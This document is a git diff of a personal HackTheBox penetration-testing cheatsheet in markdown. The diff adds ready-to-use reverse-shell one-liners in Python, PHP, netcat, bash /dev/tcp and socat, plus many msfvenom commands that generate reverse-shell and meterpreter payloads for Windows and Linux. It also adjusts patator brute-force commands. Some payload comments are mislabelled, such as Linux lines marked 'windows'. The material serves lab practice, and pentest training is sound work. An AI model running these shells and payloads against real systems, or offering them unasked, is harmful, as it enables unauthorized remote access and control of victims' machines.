@@ -25,13 +25,13 @@ My personal HackTheBox Cheatsheet from any sources.
   - [Patator](#patator)
 - Reverse Shell
   - [revshell.com](https://www.revshell.com/)
-  - Python
-  - PHP
-  - netcat
-  - bash
-  - socat
-  - Metasploit (Payload)
-  - ysoserial.exe (Windows)
+  - [Python](#reverse-shell-python)
+  - [PHP](#reverse-shell-php)
+  - [netcat](#reverse-shell-netcat)
+  - [bash](#reverse-shell-bash)
+  - [socat](#reverse-shell-socat)
+  - [Metasploit (Payload)](#metasploit-payload)
+  - [ysoserial.net (Windows)](https://github.com/pwntester/ysoserial.net)
 - File Transfer
   - wget
   - curl
@@ -207,6 +207,75 @@ hydra -l <USER> -P <PASSLIST> ssh://<IP/DOMAIN>     # brute-force ssh known user
 Patator is a multi-purpose brute-forcer, with a modular design and a flexible usage.\
 Source: https://github.com/lanjelot/patator
 ```
-patator ftp_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:mesg='Login incorrect.'              # brute-force ftp
-patator mysql_login user=<username> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:fgrep='Access denied for user' # brute-force mysql
+patator ftp_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:mesg='Login incorrect.'          # brute-force ftp
+patator mysql_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:fgrep='Access denied for user' # brute-force mysql
+```
+#### Revere Shell (Python)
+```sh
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+```python
+import socket,subprocess,os
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("IP", PORT))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p=subprocess.call(["/bin/sh","-i"]) # you can change to /bin/bash
+```
+#### Reverse Shell (PHP)
+Full Code: https://github.com/pentestmonkey/php-reverse-shell
+```sh
+php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+#### Reverse Shell (netcat)
+```sh
+nc -e /bin/sh <IP> <PORT> # if option -e available
+```
+```sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f # if option -e not available
+```
+#### Reverse Shell (bash)
+```sh
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 # tcp mode
+bash -i >& /dev/udp/<IP>/<PORT> 0>&1 # udp mode
+```
+#### Reverse Shell (socat)
+Attacker:
+```sh
+socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
+```
+Victim:
+```sh
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
+```
+##### Metasploit (Payload)
+Source: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/\
+Non-Meterpreter:
+```sh
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # staged windows x86
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe # staged windows x64
+
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # stageless windows x86
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe # stageless windows x64
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # staged linux x86
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # staged linux x64
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # stageless windows x86
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # stageless windows x64
+```
+Meterpreter:
+```sh
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # staged windows x86
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe # staged windows x64
+
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # stageless windows x86
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe # stageless windows x64
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # staged linux x86
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # staged linux x64
+
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # stageless linux x86
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # stageless linux x64
 ```
